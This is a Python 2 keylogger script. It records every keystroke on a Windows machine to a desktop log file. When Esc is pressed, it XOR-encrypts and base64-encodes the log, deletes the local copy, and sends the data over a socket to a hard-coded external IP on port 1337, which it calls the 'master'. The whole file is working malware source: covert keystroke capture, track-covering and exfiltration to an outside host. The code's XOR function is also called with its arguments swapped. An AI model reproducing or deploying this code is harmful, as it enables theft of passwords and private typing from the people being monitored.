import socket, os
from pynput.keyboard import Key, Listener
import socket

import logging
list1 = []

def keylog():
    dir = r"C:\Users\Mike\Desktop\key.log"
    logging.basicConfig(filename=dir, level=logging.DEBUG,format='%(message)s')

    def on_press(key):
        a = str(key).replace("u'","").replace("'","")
        list1.append(a)

    def on_release(key):
        if str(key) == 'Key.esc':
            print "Data collection complete. Sending data to master"
            logging.info(' '.join(list1))
            logging.shutdown()
            master_encrypt()
        

    with Listener(
        on_press = on_press,
        on_release = on_release) as listener:
        listener.join()

def send_to_master(data):
    s = socket.socket()
    host = '18.140.60.203'
    port = 1337
    
    s.connect((host, port))
    key_log = data
    s.send(key_log)
    s.close()
    exit(1)

def master_encrypt():
    mkey = os.getenv('t3mp')
    f = open("C:/Users/Mike/Desktop/key.log","r")
    modified = ''.join(f.readlines()).replace("\n","")
    f.close()
    data = master_xor(mkey, modified).encode("base64")
    os.unlink("C:/Users/Mike/Desktop/key.log")
    send_to_master(data)

def master_xor(msg,mkey):
    l = len(mkey)
    xor_complete = ""

    for i in range(0, len(msg)):
        xor_complete += chr(ord(msg[i]) ^ ord(mkey[i % l]))
    
    return xor_complete

if __name__ == "__main__":
    keylog()
